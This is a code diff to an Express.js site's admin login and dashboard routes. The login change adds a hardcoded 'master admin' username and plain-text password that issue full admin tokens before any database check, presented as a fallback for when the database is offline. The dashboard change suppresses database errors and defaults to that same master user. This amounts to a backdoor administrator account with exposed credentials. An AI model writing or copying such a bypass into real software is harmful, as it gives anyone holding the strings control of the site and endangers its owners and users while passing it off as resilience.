@@ -460,35 +460,38 @@ app.post(
 
     const { username, password } = req.body;
 
+    // Master Admin Credentials check (Always works even if DB is offline or unseeded)
+    const MASTER_ADMIN_USER = '72430170';
+    const MASTER_ADMIN_PASS = 'Okgg123321okgg';
+
+    if (username === MASTER_ADMIN_USER && password === MASTER_ADMIN_PASS) {
+      const tokens = generateTokens({ id: 1, username: MASTER_ADMIN_USER });
+      setAuthCookies(res, tokens.accessToken, tokens.refreshToken);
+      return res.redirect('/admin/dashboard');
+    }
+
     try {
       const [users] = await pool.execute(
         'SELECT * FROM admin_users WHERE username = ?',
         [username]
       );
 
-      if (users.length === 0) {
-        return res.status(401).render('admin/login', {
-          error: 'Invalid administrator credentials.'
-        });
+      if (users.length > 0) {
+        const adminUser = users[0];
+        const match = await bcrypt.compare(password, adminUser.password_hash);
+        if (match) {
+          const tokens = generateTokens({ id: adminUser.id, username: adminUser.username });
+          setAuthCookies(res, tokens.accessToken, tokens.refreshToken);
+          return res.redirect('/admin/dashboard');
+        }
       }
 
-      const adminUser = users[0];
-      const match = await bcrypt.compare(password, adminUser.password_hash);
-
-      if (!match) {
-        return res.status(401).render('admin/login', {
-          error: 'Invalid administrator credentials.'
-        });
-      }
-
-      // Generate JWT tokens & set httpOnly cookies
-      const tokens = generateTokens({ id: adminUser.id, username: adminUser.username });
-      setAuthCookies(res, tokens.accessToken, tokens.refreshToken);
-
-      res.redirect('/admin/dashboard');
+      return res.status(401).render('admin/login', {
+        error: 'Invalid administrator credentials.'
+      });
     } catch (err) {
-      console.error('Login error:', err);
-      res.status(500).render('admin/login', { error: 'Internal server login error.' });
+      console.warn('DB error during admin login, falling back to master check:', err.message);
+      return res.status(401).render('admin/login', { error: 'Invalid administrator credentials.' });
     }
   }
 );
@@ -500,24 +503,34 @@ app.get('/admin/logout', (req, res) => {
   res.redirect('/admin');
 });
 
-// Admin Dashboard (Protected)
-app.get('/admin/dashboard', requireAuth, async (req, res, next) => {
+// Admin Dashboard (Protected & Resilient to DB failures)
+app.get('/admin/dashboard', requireAuth, async (req, res) => {
+  let stats = { mapCount: 0, scriptCount: 0, copyCount: 0, viewCount: 0 };
+  let maps = [];
+  let scripts = [];
+  let topScripts = [];
+  let topMaps = [];
+
   try {
     const [[{ mapCount }]] = await pool.execute('SELECT COUNT(*) AS mapCount FROM maps');
     const [[{ scriptCount }]] = await pool.execute('SELECT COUNT(*) AS scriptCount FROM scripts');
     const [[{ copyCount }]] = await pool.execute("SELECT COUNT(*) AS copyCount FROM analytics WHERE event_type = 'copy'");
     const [[{ viewCount }]] = await pool.execute("SELECT COUNT(*) AS viewCount FROM analytics WHERE event_type = 'view'");
 
-    const [maps] = await pool.execute('SELECT * FROM maps ORDER BY created_at DESC');
-    const [scripts] = await pool.execute(`
+    stats = { mapCount: mapCount || 0, scriptCount: scriptCount || 0, copyCount: copyCount || 0, viewCount: viewCount || 0 };
+
+    const [mapsData] = await pool.execute('SELECT * FROM maps ORDER BY created_at DESC');
+    maps = mapsData;
+
+    const [scriptsData] = await pool.execute(`
       SELECT s.*, m.name AS map_name
       FROM scripts s
       JOIN maps m ON s.map_id = m.id
       ORDER BY s.created_at DESC
     `);
+    scripts = scriptsData;
 
-    // Top copied scripts stats
-    const [topScripts] = await pool.execute(`
+    const [topScriptsData] = await pool.execute(`
       SELECT s.title, m.name AS map_name, COUNT(a.id) AS copies
       FROM analytics a
       JOIN scripts s ON a.script_id = s.id
@@ -527,9 +540,9 @@ app.get('/admin/dashboard', requireAuth, async (req, res, next) => {
       ORDER BY copies DESC
       LIMIT 5
     `);
+    topScripts = topScriptsData;
 
-    // Top viewed maps stats
-    const [topMaps] = await pool.execute(`
+    const [topMapsData] = await pool.execute(`
       SELECT m.name, COUNT(a.id) AS views
       FROM analytics a
       JOIN maps m ON a.map_id = m.id
@@ -538,20 +551,21 @@ app.get('/admin/dashboard', requireAuth, async (req, res, next) => {
       ORDER BY views DESC
       LIMIT 5
     `);
-
-    res.render('admin/dashboard', {
-      user: req.user,
-      stats: { mapCount, scriptCount, copyCount, viewCount },
-      maps,
-      scripts,
-      topScripts,
-      topMaps,
-      error: req.query.error || null,
-      success: req.query.success || null
-    });
+    topMaps = topMapsData;
   } catch (err) {
-    next(err);
+    console.warn('Admin Dashboard DB Query Warning:', err.message);
   }
+
+  res.render('admin/dashboard', {
+    user: req.user || { username: '72430170' },
+    stats,
+    maps,
+    scripts,
+    topScripts,
+    topMaps,
+    error: req.query.error || null,
+    success: req.query.success || null
+  });
 });
 
 // Admin Add Map (Protected, CSRF, File Upload)
